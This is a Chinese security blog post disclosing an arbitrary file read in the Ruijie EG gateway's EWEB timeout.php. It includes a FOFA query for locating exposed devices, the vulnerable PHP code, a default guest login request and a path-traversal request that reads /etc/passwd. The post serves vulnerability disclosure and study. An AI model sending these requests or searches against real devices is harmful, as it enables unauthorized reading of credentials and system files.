---
title: "锐捷-EWEB timeout.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-system_pi-timeout-fileread.html
asset_dir: assets/锐捷-eweb-timeout.php-文件读取漏洞
---

# 锐捷-EWEB timeout.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/26 18:36
* 1204浏览
* [0评论](#comment)
* 12分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `timeout.php` 的 `getFileAction` 存在 任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞预警服务

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `timeout.php` 关键业务 `getFileAction` 逻辑的实现

```
function getFileAction(){
    $fileName = p("fileName");
    $config = @file_get_contents(DS . "data" . DS . $fileName);    //获取web配置信息
    $config = iconv('GBK//IGNORE', 'UTF-8', $config);
    if ($config == false) {
        $config = '';
    }
    json_echo($config);
}
```

getFileAction 接收一个 fileName 参数，将其直接拼接到 `file_get_contents` 函数的 `$filename`

部分读取，无任何过滤或校验，因此造成任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

[![锐捷-EWEB timeout.php 文件读取漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 读取文件

```
POST /system_pi/timeout.php?a=getFile HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

fileName=../etc/passwd
```

[![锐捷-EWEB timeout.php 文件读取漏洞](images/img-002-706ec117bdb5.webp)](https://image.mrxn.net/cc8783a4e29d4810997da79d401c62ef.webp)

成功读取到 `/etc/passwd` 内容

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.获取cookie](#toc-5-1-)
* [5.2.读取文件](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[锐捷-EWEB timeout.php 文件读取漏洞](https://mrxn.net/jswz/ruijieweb-system_pi-timeout-fileread.html)  
文章链接：<https://mrxn.net/jswz/ruijieweb-system_pi-timeout-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

计算机硬件

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-system\_pi-timeout-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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